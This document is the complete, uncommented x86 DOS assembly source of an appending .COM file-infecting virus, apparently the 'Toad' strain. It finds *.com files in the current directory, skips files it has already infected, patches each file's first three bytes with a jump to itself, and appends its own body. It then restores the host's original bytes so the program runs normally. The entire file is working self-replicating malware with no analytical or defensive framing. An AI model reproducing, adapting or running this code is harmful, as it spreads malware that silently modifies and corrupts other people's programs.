   code segment
       assume cs:code,ds:code
       org 100h

   start:
       db 0e9h,0,0

   toad:
       call bounce

   bounce:
       pop  bp
       sub  bp,OFFSET bounce

   first_three:
       mov cx,3
       lea  si,[bp+OFFSET thrbyte]
       mov  di,100h
           push di
       rep movsb

   move_dta:
       lea  dx,[bp+OFFSET hide_dta]
       mov  ah,1ah
       int  21h

   get_one:
       mov  ah,4eh
       lea  dx,[bp+comsig]
       mov  cx,7

   next:
       int  21h
           jnc  openit
       jmp  bug_out

   Openit:
       mov  ax,3d02h
       lea  dx,[bp+OFFSET hide_dta+1eh]
       int  21h
       xchg ax,bx

   rec_thr:
       mov  ah,3fh
           lea  dx,[bp+thrbyte]
       mov  cx,3
           int  21h

   infect_chk:
       mov  ax,word ptr [bp+hide_dta+1ah]
       mov  cx,word ptr [bp+thrbyte+1]
       add  cx,horny_toad-toad+3
       cmp  ax,cx
           jz   close_up

   jmp_size:
           sub  ax,3
           mov  word ptr [bp+newjump+1],ax



   to_begin:
           mov ax,4200h
           xor cx,cx
           xor dx,dx
           int 21h

   write_jump:
           mov ah,40h
           mov cx,3
           lea dx,[bp+newjump]
           int 21h

   to_end:
           mov ax,4202h
           xor cx,cx
           xor dx,dx
           int 21h

   write_body:
           mov ah,40h
           mov cx,horny_toad-toad
           lea dx,[bp+toad]
           int 21h

   close_up:
           mov  ah,3eh
           int  21h

   next_bug:
           mov  ah,4fh
           jmp  next

   bug_out:
           mov  dx,80h
           mov  ah,1ah
           int  21h
           retn


   comsig db '*.com',0
   thrbyte db 0cdh,20h,0
   newjump db 0e9h,0,0

   horny_toad label near

   hide_dta db 42 dup (?)

   code    ENDS
           END    start
